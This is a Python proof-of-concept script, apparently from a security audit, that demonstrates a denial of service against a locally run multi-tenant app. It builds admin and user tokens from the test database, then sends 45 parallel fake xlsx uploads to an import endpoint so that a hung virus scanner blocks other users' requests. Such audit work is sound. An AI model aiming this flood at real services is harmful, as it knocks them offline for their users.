import sys, time, threading, subprocess, httpx, io
sys.path.insert(0,"/tmp/audit-poc/live"); import lib
def sql(q): return subprocess.run(["docker","exec","audit-pg","psql","-U","sbam","-d","sbam","-At","-c",q],capture_output=True,text=True).stdout.strip()
TA=sql("select id from sbam.tenants where name='TenantA'"); a=sql("select id from sbam.users where email='adminA@audit.test'"); f=sql("select id from sbam.users where email='fdeA1@audit.test'")
HA={"Authorization":"Bearer "+lib.token(a,TA,["sbam-admin"],name="adminA")}; HF={"Authorization":"Bearer "+lib.token(f,TA,["sbam-fde"],name="fdeA1")}
B="http://127.0.0.1:55997/api/v1"; c=httpx.Client(timeout=5)
print("before:", c.get(B+"/me",headers=HF).status_code)
tiny=b"PK\x05\x06"+b"\0"*18   # not even a real xlsx: the scan happens first
def attack():
    try: httpx.post(B+"/admin/masters/import",headers=HA,files={"file":("m.xlsx",tiny,"application/octet-stream")},data={"mode":"validate-only"},timeout=200)
    except Exception: pass
ts=[threading.Thread(target=attack,daemon=True) for _ in range(45)]; [t.start() for t in ts]; time.sleep(5)
t=time.time()
try: r=c.get(B+"/me",headers=HF).status_code
except Exception as e: r=type(e).__name__
print(f"during 45 parallel imports against a hung clamd: GET /me by another user -> {r} after {time.time()-t:.1f}s")
try: print("health/live ->", httpx.get("http://127.0.0.1:55997/health/live",timeout=5).status_code)
except Exception as e: print("health/live ->", type(e).__name__)
